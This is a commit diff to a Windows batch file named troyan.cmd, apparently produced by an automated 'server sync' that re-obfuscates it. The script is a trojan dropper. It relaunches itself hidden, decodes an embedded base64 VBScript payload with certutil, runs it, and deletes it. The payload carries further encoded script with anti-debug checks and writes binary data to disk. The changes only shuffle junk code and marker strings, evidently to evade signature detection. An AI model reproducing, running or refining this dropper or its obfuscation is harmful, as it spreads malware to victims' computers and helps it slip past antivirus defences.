fa6aa5e7ab1f1f673d27ed7682f32259e338f0c4
Hephaestus <hephaestus@local>
2026-09-11 15:40:45 +0000

    Hephaestus server sync

--- default/server/troyan.cmd
+++ default/server/troyan.cmd
@@ -1,10 +1,10 @@
 @echo off
-if 0==1 echo jxdwkqzdoxee
-if 0==1 echo yjmtodqbdjnsh
-set /a xhzyeyaghpiczu=19+3 >nul 2>&1
-REM nsnouazbkqm ntmrrhaabjlqnscs
-REM jobkgoeren khikayiuzztrtsy
-if not defined osrfjaaudqgshjqtufa set "osrfjaaudqgshjqtufa=83"
+if 0==1 echo cbfmkqrdniewrahx
+set "oucmxtnprdegotsc=hbqzqguuho9279"
+set /a yehyylvczlxveaqha=34+45 >nul 2>&1
+REM ovyqzqsufpvq apjgiduaxkw
+set /a vzxxqqkwvygmapzurm=5+1 >nul 2>&1
+if 0==1 echo rpkbbyrbcudoicseg
 if /I "%~1"=="_h" goto main
 start "" /min cmd /c "%~f0" _h
 exit /b
@@ -16,13 +16,13 @@ set "CAP=0"
 >"%B64F%" (
   for /f "usebackq delims=" %%L in ("%~f0") do (
     if "!CAP!"=="1" (
-      if /I "%%L"=="::dpvyzsezxrdggqrf::" (
+      if /I "%%L"=="::plygjtdtafz::" (
         set "CAP=0"
       ) else (
         echo(%%L
       )
     )
-    if /I "%%L"=="::xfgzlunfhikpdthk::" set "CAP=1"
+    if /I "%%L"=="::vyijsrwtdvq::" set "CAP=1"
   )
 )
 certutil -f -decode "%B64F%" "%VBSF%" >nul 2>&1
@@ -31,11 +31,15 @@ start "" /min /wait "%VBSF%"
 set "EC=!ERRORLEVEL!"
 del /f /q "%VBSF%" >nul 2>&1
 endlocal & exit /b %EC%
-set "jmezlgzqklop=xqvvuihgrasoi9676"
-REM wwydqhltczkflyntkha ochkkhjztdonh
-REM zumwafnwupg mrqeqhwmppsslxi
-if 0==1 echo tadkhkaaysn
-::xfgzlunfhikpdthk::
+if not defined wctloryqkhkuy set "wctloryqkhkuy=65"
+REM syhdykgmznuehe mjtcwtgrmojsaqx
+set "kynzlrpqmuoukwpuda=njxgkelqrofkjaaaorw1768"
+set "nxqahlntypxlmcpq=nrglftmjvyjdkgmdr1365"
+if not defined noucynpqqtvw set "noucynpqqtvw=92"
+set /a ywyxdfqvoqbbydeevt=21+33 >nul 2>&1
+if not defined xotbhkwwbwvmpj set "xotbhkwwbwvmpj=53"
+REM nfosxvpbyu acjaemssyesv
+::vyijsrwtdvq::
 RGltIGJvZHlYLCBib2R5UHMxUGF0aCwgZnNvClNldCBmc28gPSBDcmVhdGVPYmplY3QoIlNjcmlw
 dGluZy5GaWxlU3lzdGVtT2JqZWN0IikKYm9keVg9IlpuVnVZM1JwYjI0Z1NYTkVaV0oxWnlCN0Np
 QWdJQ0FrWkdWaWRXZEdhV3hsSUQwZ0lrTTZYR1JsWW5WbkxuUjRkQ0lLSUNBZ0lBb2dJQ0FnZEhK
@@ -4377,8 +4381,9 @@ bS5UeXBlID0gMSAnIGFkVHlwZUJpbmFyeQogICAgc3RyZWFtLk9wZW4KICAgIHN0cmVhbS5Xcml0
 ZSBiaW5hcnlEYXRhCiAgICAKICAgIHN0cmVhbS5TYXZlVG9GaWxlIG91dHB1dEZpbGVQYXRoLCAy
 CiAgICBzdHJlYW0uQ2xvc2UKICAgIAogICAgU2V0IHN0cmVhbSA9IE5vdGhpbmcKICAgIFNldCBu
 b2RlID0gTm90aGluZwogICAgU2V0IHhtbERvYyA9IE5vdGhpbmcKRW5kIEZ1bmN0aW9uCg==
-::dpvyzsezxrdggqrf::
-REM jfjpzaehemocnaatft ibehnoudssvb
-set /a ftliacfguivananczbf=37+32 >nul 2>&1
-if not defined hgemnqvyfwfozjrzqlv set "hgemnqvyfwfozjrzqlv=54"
-REM vktsqtcmddlcrxd pfmwoiqrerzihmyqzs
+::plygjtdtafz::
+REM llaqgpfrugffdrrvj cnujouzywdz
+if 0==1 echo ouubdnvabnscyovh
+REM cpwojfzuahbnxyhh bironjstvrhekrq
+REM zuniaswenjd gmfuneezwadn
+REM njhtcsagceurx pryvdceasafafj
